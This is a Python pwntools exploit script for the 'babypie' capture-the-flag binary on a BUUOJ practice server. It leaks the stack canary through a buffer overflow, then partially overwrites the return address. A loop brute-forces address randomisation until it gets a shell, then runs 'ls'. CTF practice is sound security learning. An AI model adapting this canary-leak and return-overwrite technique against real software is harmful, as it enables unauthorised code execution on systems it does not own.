#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 22:41:08
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./babypie"
menu = ""
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "../../libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 27440
    sh = remote(IP,port)
elf = ELF(file_name)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))
def pwn():
    sh.recvuntil("Input your Name:\n")
    # debug()
    sh.send('a'*0x29)
    sh.recvuntil('a'*0x29)
    canary = u64(sh.recv(7).rjust(8,"\x00"))
    log.info("canary=>{}".format(hex(canary)))
    payload =  'a' * 0x28 + p64(canary) + 'a'*8 + "\x3e" + "\x5a"
    sh.send(payload)
    sh.sendline("ls")
    sh.interactive()
    
    sh.recv(12,timeout=1)

while True:
    try:
        sh = remote(IP,port)
        pwn()

        break
    except Exception:
        sh.close()
        continue